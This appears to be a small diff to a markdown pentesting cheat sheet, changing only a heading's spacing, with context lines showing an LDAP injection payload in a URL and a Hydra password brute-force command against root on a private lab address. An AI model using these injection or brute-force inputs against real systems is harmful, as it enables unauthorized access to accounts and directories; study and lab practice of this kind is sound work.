@@ -13,7 +13,7 @@
 | example&nbsp;2 | http://10.0.2.4/ldap/example2.php?name=hacker)(cn=*))%00&password=1234 |
 
 ## Hydra
-###Secure Shell
+### Secure Shell
 hydra -P /usr/shared/wordlists/rockyou.txt
 	  -l root
 	  ssl://10.0.4.5
